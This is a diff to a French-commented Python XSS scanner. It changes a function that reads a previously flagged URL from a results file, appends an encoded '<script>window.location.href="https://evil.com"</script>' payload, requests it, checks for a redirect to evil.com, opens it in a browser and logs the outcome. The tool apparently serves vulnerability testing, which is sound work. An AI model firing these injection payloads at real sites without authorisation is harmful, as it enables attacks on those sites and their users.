@@ -12,6 +12,7 @@ import subprocess
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
 import tempfile
+import re
 
 
 
@@ -91,48 +92,103 @@ def scan_XSS(target_url):
             f_out.write("Aucune vulnérabilité XSS trouvée.\n")
             print("✅ Aucun résultat à enregistrer (aucune vulnérabilité XSS trouvée).")
                     
+
 def test_xss_redirection(base_url: str):
     """
-    Teste si une redirection vers evil.com est détectable via une requête HTTP simple.
-    Si oui, ouvre Firefox avec l'URL contenant le payload.
+    Teste la redirection XSS vers evil.com en lisant la 2ᵉ ligne du fichier
+    results/<base_url_sans_schema>_result.txt (sans les 5 premiers caractères
+    et sans "<script>alert(1)</script>"), puis enregistre le résultat de la
+    détection directement dans ce même fichier.
 
     Args:
-        base_url (str): L'URL de base à tester, par exemple "http://example.com/page?param="
+        base_url (str): URL de base (ex: "http://example.com/page" ou "https://vulnweb.com").
+                        Avant de former le nom de fichier, on retire le schéma HTTP/HTTPS.
 
     Returns:
         tuple: (redirection_detectée: bool, url_finale: str)
     """
-    payload = '<script>window.location.href="https://evil.com"</script>'
-    encoded_payload = urllib.parse.quote(payload)
-    target_url = f"{base_url}{encoded_payload}"
 
+    # 1) On retire le schéma "http://" ou "https://" de base_url
+    base_url_sans_schema = re.sub(r"^https?://", "", base_url)
+    # On remplace les slashs "/" par "_" pour que le nom de fichier soit valide.
+    base_url_sans_schema = base_url_sans_schema.replace("/", "_")
+
+    # 2) Construction du chemin du fichier résultat
+    fichier_result = f"results/{base_url_sans_schema}result.txt"
+    if not os.path.exists(fichier_result):
+        print(f"[❌] Le fichier {fichier_result} n'existe pas.")
+        return False, ""
+
+    # 3) Lecture des lignes du fichier
+    try:
+        with open(fichier_result, "r", encoding="utf-8") as f:
+            lignes = f.readlines()
+    except Exception as e:
+        print(f"[⚠️] Impossible de lire {fichier_result} : {e}")
+        return False, ""
+
+    # 4) Vérification qu'il y a bien au moins 2 lignes
+    if len(lignes) < 2:
+        print(f"[❌] {fichier_result} ne contient pas assez de lignes (moins de 2).")
+        return False, ""
+
+    # 5) On extrait la 2ᵉ ligne (index 1), on supprime le "\n", puis on retire les 5 premiers caractères
+    ligne2 = lignes[1].rstrip("\n")
+    if len(ligne2) <= 5:
+        print(f"[❌] La deuxième ligne de {fichier_result} est trop courte pour retirer 5 caractères : '{ligne2}'")
+        return False, ""
+    real_base_url = ligne2[5:].strip()
+
+    # 6) On supprime s'il existe "<script>alert(1)</script>"
+    real_base_url = real_base_url.replace("<script>alert(1)</script>", "").strip()
+    print(f"[ℹ️] URL extraite (après retrait des 5 premiers caractères et suppression du script) : {real_base_url}")
+
+    # 7) Préparation du payload XSS (qui force une redirection vers evil.com)
+    payload = '<script>window.location.href="https://evil.com"</script>'
+    encoded_payload = urllib.parse.quote(payload, safe="")
+
+    # 8) Construction de l'URL de test
+    #    Si real_base_url n'a pas déjà "?" ou "=" en fin, il faudra peut-être ajouter "?" avant le payload.
+    #    Ici on concatène en supposant que la 2ᵉ ligne se termine correctement pour recevoir la charge.
+    target_url = f"{real_base_url}{encoded_payload}"
+    print(f"[ℹ️] URL de test construite avec payload : {target_url}")
+
+    # 9) Envoi de la requête GET (suivi des redirections)
     try:
         response = requests.get(target_url, allow_redirects=True, timeout=5)
         final_url = response.url
         redirige = "evil.com" in final_url
 
         if redirige:
-            print("[✅] Redirection détectée vers :", final_url)
+            print(f"[✅] Redirection détectée vers : {final_url}")
 
-            # 🧨 Lance le navigateur par défaut (évite d'exiger Firefox uniquement)
+            # Ouverture dans le navigateur pour vérification visuelle (optionnel)
             process = subprocess.Popen(["xdg-open", target_url])
-
-            # ⏳ Attend 5 secondes
             time.sleep(5)
-
-            # 🛑 Termine le processus proprement
             process.terminate()
             time.sleep(1)
             if process.poll() is None:
                 process.kill()
         else:
-            print("[❌] Pas de redirection. URL finale :", final_url)
+            print(f"[❌] Pas de redirection vers evil.com. URL finale : {final_url}")
 
-        return redirige, final_url
+    except requests.RequestException as e:
+        print(f"[⚠️] Erreur réseau lors de la requête : {e}")
+        # Même en cas d'erreur réseau, on souhaite enregistrer le fait qu'on n'a pas pu détecter de redirection
+        redirige = False
+        final_url = f"ErreurRequete: {e}"
 
+    # 10) On enregistre le résultat dans le même fichier (en mode append)
+    try:
+        with open(fichier_result, "a", encoding="utf-8") as f:
+            statut = "TRUE" if redirige else "FALSE"
+            # Exemple de ligne ajoutée : "RedirectionXSS=TRUE; FinalURL=https://evil.com/…"
+            f.write(f"RedirectionXSS={statut}; FinalURL={final_url}\n")
+        print(f"[ℹ️] Résultat de la redirection enregistré dans {fichier_result}.")
     except Exception as e:
-        print("[⚠️] Erreur réseau :", e)
-        return False, ""  
+        print(f"[⚠️] Impossible d'écrire dans {fichier_result} : {e}")
+
+    return redirige, final_url 
 
 def test_XSS(target_url):
 
